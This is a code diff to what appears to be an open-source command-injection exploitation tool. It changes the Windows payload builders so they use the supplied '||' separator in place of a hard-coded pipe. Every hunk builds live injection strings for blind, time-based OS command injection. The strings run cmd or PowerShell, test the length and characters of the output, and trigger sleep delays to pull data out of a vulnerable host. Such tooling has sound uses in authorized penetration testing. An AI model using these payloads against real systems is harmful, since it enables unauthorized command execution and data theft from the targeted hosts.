@@ -28,8 +28,7 @@ Time-based decision payload (check if host is vulnerable).
 def decision(separator, TAG, output_length, delay, http_request_method):
   if settings.TARGET_OS == "win":
     if separator == "||" :
-      pipe = "|"
-      payload = (pipe + " " +
+      payload = (separator +  " " +
                  "for /f \"delims=\" %i in ('cmd /c \"powershell.exe write '" + TAG + "'.length\"') "
                  "do if %i==" +str(output_length) + " "
                  "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\")"
@@ -105,8 +104,7 @@ def decision_alter_shell(separator, TAG, output_length, delay, http_request_meth
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"print len(\'" + TAG + "\')\""
     if separator == "||" :
-      pipe = "|"
-      payload = (pipe + " " 
+      payload = (separator +  " " 
                 "for /f \"delims=\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(output_length) + " "
@@ -186,8 +184,7 @@ Execute shell commands on vulnerable host.
 def cmd_execution(separator, cmd, output_length, delay, http_request_method):
   if settings.TARGET_OS == "win":
     if separator == "||" :
-      pipe = "|"
-      payload = (pipe + " "
+      payload = (separator +  " "
                 "for /f \"delims=\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do if %i==" +str(output_length) + " "
@@ -262,8 +259,7 @@ __Warning__: The alternative shells are still experimental.
 def cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request_method):
   if settings.TARGET_OS == "win":
     if separator == "||" :
-      pipe = "|"
-      payload = (pipe + " " + 
+      payload = (separator +  " " + 
                 "for /f \"delims=\" %i in ('cmd /c " +
                 cmd + 
                 "') do if %i==" +str(output_length) + " " +
@@ -342,8 +338,7 @@ Get the execution output, of shell execution.
 def get_char(separator, cmd, num_of_chars, ascii_char, delay, http_request_method):
   if settings.TARGET_OS == "win":
     if separator == "||" :
-      pipe = "|"
-      payload = (pipe + " " +
+      payload = (separator +  " " +
                 "for /f \"delims=\" %i in ('cmd /c \"powershell.exe write ([int][char](([string](cmd /c " +
                 cmd + ")).trim()).substring(" +str(num_of_chars-1)+ ",1))\"') do if %i==" +str(ascii_char)+
                 " (cmd /c \"powershell.exe Start-Sleep -s " + str(delay + 1) + "\")"
@@ -413,8 +408,7 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_r
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"import os; print ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "])\""
     if separator == "||" :
-      pipe = "|"
-      payload = (pipe + " " 
+      payload = (separator +  " " 
                 "for /f \"delims=\" %i in ('cmd /c " + 
                 python_payload +
                 "') do if %i==" +str(ascii_char) + " "
@@ -491,8 +485,7 @@ Get the execution output, of shell execution.
 def fp_result(separator, cmd, num_of_chars, ascii_char, delay, http_request_method):
   if settings.TARGET_OS == "win":
     if separator == "||" :
-      pipe = "|"
-      payload = (pipe + " " + 
+      payload = (separator +  " " + 
                 "for /f \"delims=\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do if %i==" +str(ascii_char)+
@@ -564,8 +557,7 @@ __Warning__: The alternative shells are still experimental.
 def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_request_method):
   if settings.TARGET_OS == "win":
     if separator == "||" :
-      pipe = "|"
-      payload = (pipe + " " + 
+      payload = (separator +  " " + 
                 "for /f \"delims=\" %i in ('cmd /c " +
                 cmd + 
                 "') do if %i==" +str(ascii_char) + " " +
